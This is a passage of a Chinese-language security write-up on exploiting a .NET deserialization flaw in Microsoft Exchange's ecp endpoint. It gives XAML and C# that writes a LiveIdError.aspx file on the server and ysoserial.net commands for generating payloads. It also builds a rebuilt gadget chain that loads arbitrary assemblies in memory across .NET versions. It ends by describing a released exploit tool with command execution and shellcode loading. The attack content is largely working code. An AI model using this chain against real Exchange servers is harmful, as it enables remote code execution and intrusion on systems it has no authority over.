编译执行访问，均可在ecp目录创建LiveIdError.aspx文件。
###  0x43 优化文件写入
显然，粗暴的方式有着各种各样的缺点，对于完美主义者，还需要找到其他方式进行规避。
我们现在已知绝对路径存放于`%ExchangeInstallPath%`，那么只要将其取出作为`ObjectDataProvider.MethodParameters`的第一个参数即可。但通过ObjectDataProvider调用方法的后，存放于ResourceDictionary中的实际上还是一个ObjectDataProvider实例，直接将其作为参数传入会抛出异常，所以需要一个能够调用方法且返回类型本身的方式。
在查询xaml官方文档后可以找到`x:FactoryMethod`指令，该指令用于对象初始化。其实现为通过调用静态方法并强制转换为xaml元素指定的对象类型，完全符合需求。
那么解决方案也就很简单了：在`s:String`元素上以`FactoryMethod`方式调用`[mscorlib]System.Environment::GetEnvironmentVariable`获取安装路径，之后以同样方式调用`[mscorlib]System.String.Concat`拼接文件名，最后调用`AppendAllText`写入文件。
完整的xaml如下：
          ClientAccessecpLiveIdError.aspx
此xaml等同于以下C#代码：
    string a=Environment.GetEnvironmentVariable("ExchangeInstallPath");
    string b=string.Concat(a,"ClientAccessecpLiveIdError.aspx");
    File.AppendAllText(b,"");
    HttpContext.Current.Response.End();
编译执行访问，可在未知绝对路径的情况下无感知地创建我们需要的空白文件。
###  0x44 高级操作与ysoserial.net缺陷
通过第一阶段创建的白名单文件，可以将不足`2048字节`的payload拓展到IIS默认的`4M`上限，这样我们就能通过更大的payload进行高级操作。
所谓高级操作，就是以`不落地`的方式在当前进程`内存`中执行`任何操作`，包括但不限于执行命令并回显、读写文件、加载ShellCode、后渗透等等。在.net无限制反序列化的环境前提下，可以通过`ObjectSerializedRef`反序列化`LinqIterator`对象在内存中加载.net程序集并实例化，最终实现任意代码执行。这个方式在yssoserial.net中以`ActivitySurrogateSelectorGenerator`和`ActivitySurrogateSelectorFromFileGenerator`进行实现。
`ActivitySurrogateSelectorFromFileGenerator`提供一个将C#源码编译为程序集并在远程加载的功能，首先创建以下测试代码：
    class E
    {
      public E()
      {
        try
        {
          System.Diagnostics.Process.Start("notepad");
          System.Web.HttpContext.Current.Response.Write("exploit!");
          System.Web.HttpContext.Current.Response.End();
        }
        catch{}
      }
    }
之后执行以下命令生成payload。这里注意，为了保证测试效果防止提前踩坑，请`暂时在目标`Exchange服务器上执行：
    ysoserial -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c exploitclass.cs;System.Web.dll;System.dll >o.dat
修改之前的反序列化测试程序，编译执行访问，不出意外的话可以得到以下结果：
成功创建子进程notepad，回显输出exploit!，表明上述代码已经在远程执行。接下来对代码进行自定义修改即可进行任何操作，例如命令回显、ShellCode等等。
看似一切完美？其实并不。现在可以打开`C:WindowsMicrosoft.NETFramework64v4.0.30319`目录，查看`System.Core.dll`的文件版本。例如当前测试环境为`4.7.3362.0`，表示fx版本为`4.7.x`。
下面来模拟真实环境远程生成payload。真实环境下不可能知道对方的fx版本（返回头中的版本号永远都是4.0.30319），所以常规做法是通过ysoserial.net直接生成一个payload并发送。
例如通过同样的方式，在文件版本`4.6.1098.0`（对应fx版本`4.6.x`）的环境下能够成功生成payload，但继续编译执行访问，不会得到任何结果。
如果将这个payload复制到Exchange服务器并使用以下Powershell脚本进行测试，会得到一个`TypeLoadException`：
    $fmt=new-object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter;
    $mft.Deserialize((new-object System.IO.FileStream("o.dat",'Open','Read')));
根据错误信息对应到`[System.Core]System.Linq.Enumerable`类，可以看到在fx
4.7.x的程序集中这个类的名称由`Enumerable+d__16`变成了`Enumerable+d__17`。
反序列化时找不到类型自然无法创建实例，最终导致利用失败。
###  0x45 构造完美的反序列化数据
解决这个问题需要结合ActivitySurrogateSelectorGenerator以及LinqIterator的源码进行分析。  
首先要理解ActivitySurrogateSelectorGenerator的工作原理，其逻辑非常简单：通过`linq`调用，顺序执行`Assembly::Load(byte[])`、`Assembly.GetTypes()`、`Activator::CreateInstance(Type)`，从而`实例化`由字节数组存储的程序集中定义的类，达到代码执行的效果。整体流程大致等价为以下C#代码：
    foreach(byte[] data in byte[][])
    {
      foreach(Type t in Assembly.Load(data).GetTypes())
      {
        Activator.CreateInstance(t);
      }
    }
而序列化保存的数据大部分都是在Linq调用过程中用于返回数据的`迭代器`或`枚举器`。
之后，在ilspy中查找`Enumerable+d__17`的引用，可发现在`System.Linq.Enumerable.SelectManyIterator`方法进行调用，反编译可以看到以下代码：
可以看到是一个`迭代器语法糖`，很明显是由编译器`自动生成`的状态机类。实际上，类型名中的`16`/`17`为编译期间由编译器内部维护的一个序号，随着自动生成的类增加而增长，所以在不同版本的fx中不一定相同。
为了避免这样的问题，继续查找是哪个调用导致将此对象写入了序列化数据中。迭代器的上级调用有且只有`System.Linq.Enumerable.SelectMany`，而这正是在ActivitySurrogateSelectorGenerator中调用的拓展方法：
    var e2 = e1.SelectMany(map_type);
现在最后的问题就转换成了如何将`SelectMany`替换为其他等价表达式。根据代码以及生成的数据可以知道，`Where`表达式/拓展方法返回的`WhereSelectEnumerableIterator`不会调用自动生成的类，是一个较好的序列化目标。
`WhereSelectEnumerableIterator`中包含两个委托`selector`和`predicate`。其中selector的签名为`Func`，可以调用诸如`Assembly.Load`等静态方法将一个对象转换为另外的对象，或是在一个对象实例上调用`无参方法`；predicate的签名为`Func`，会作为条件判断在selector`之前`进行调用。
缺失的调用链中`GetTypes`返回一个Type数组，由`[mscorlib]System.Array`基类实现`IEnumerable`接口，于是可以调用`GetEnumerator`方法，获取一个`IEnumerator`对象。  
通过获取`IEnumerator`对象的`Current`属性，可以得到Type实例，在获取之前需要调用`MoveNext`方法，该方法的签名恰好和predicate匹配。
所以最后不难得出以下调用链：
    Activator.CreateInstance(Assembly.Load(byte[]).GetTypes().GetEnumerator().{MoveNext(),get_Current()})
对应的代码为：
    static IEnumerable GetEnum
    (
        IEnumerable src,
        Func predicate,
        Func selector
    )
    {
      Type t=Assembly.Load("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
        .GetType("System.Linq.Enumerable+WhereSelectEnumerableIterator`2")
        .MakeGenericType(typeof(TSource),typeof(TResult));
      return t.GetConstructors()[0].Invoke(new object[]{src,predicate,selector}) as IEnumerable;
    }
    IEnumerable e2=GetEnum(new byte[][]{File.ReadAllBytes("RemoteStub.dll")},null,Assembly.Load);
    IEnumerable> e3=GetEnum>(e2,
        null,
        (Func>)Delegate.CreateDelegate
            (
                typeof(Func>), 
                typeof(Assembly).GetMethod("GetTypes")
            )
    );
    IEnumerable> e4 = GetEnum,IEnumerator>(e3,
        null,
        (Func,IEnumerator>)Delegate.CreateDelegate
        (
            typeof(Func,IEnumerator>), 
            typeof(IEnumerable).GetMethod("GetEnumerator")
        )
    );
    IEnumerable e5 = GetEnum,Type>(e4,
        (Func,bool>)Delegate.CreateDelegate
        (
            typeof(Func,bool>), 
            typeof(IEnumerator).GetMethod("MoveNext")
        ),
        (Func,Type>)Delegate.CreateDelegate
        (
            typeof(Func,Type>), 
            typeof(IEnumerator).GetProperty("Current").GetGetMethod()
        )
    );
    PagedDataSource pds = new PagedDataSource() { DataSource = e5 };
    //....
    ls.Add(e1);
    ls.Add(e2);
    # ls.Add(e3);
    ls.Add(e4);
    ls.Add(e5);
    ls.Add(pds);
    //....
注意，通过`链式Select`会调用`WhereSelectEnumerableIterator.Select`方法，此方法的调用过程中使用了`lambda表达式`，同样会导致序列化编译器自动生成的类，所以只能通过反射进行创建。`RemoteStub.dll`为需要在远程加载执行的dll。
修改ActivitySurrogateSelectorGenerator并重新生成payload，其中不再包含任何自动生成类。编译执行访问成功加载执行我们指定的程序集，至此漏洞利用圆满达成。
## 0x50 Exp
有了上述研究结论，编写出更为通用的exp也就不难了，可以在 进行下载。
其中ExchangeDetect为检测程序，原理基于0x31一节所述，可以在`CoreCLR`环境下运行。仅支持单个检测，存在漏洞的话`ExitCode`将返回4。如果需要批量检测请自行修改或判断返回值。
执行结果如图所示：
ExchangeCmd为Exp，支持命令执行和远程ShellCode加载，其原理基于0x41-0x45小节所述。第一阶段通过反序列化写入空白`LiveIdError.aspx`，第二阶段通过向此文件发送最终的Payload加载指定自定义dll，达到代码执行。
执行成功后会返回一个伪交互式命令行，其支持的命令如下：
    exec  [args]
      exec command
    arch
      get remote process architecture(for shellcode)
    shellcode 
      run shellcode
    exit
      exit program
在本地测试环境执行的结果如图所示：
RemoteStub为此Exp发送的dll，所有的交互都已进行加密，其执行`whoami /all`产生的数据如图所示：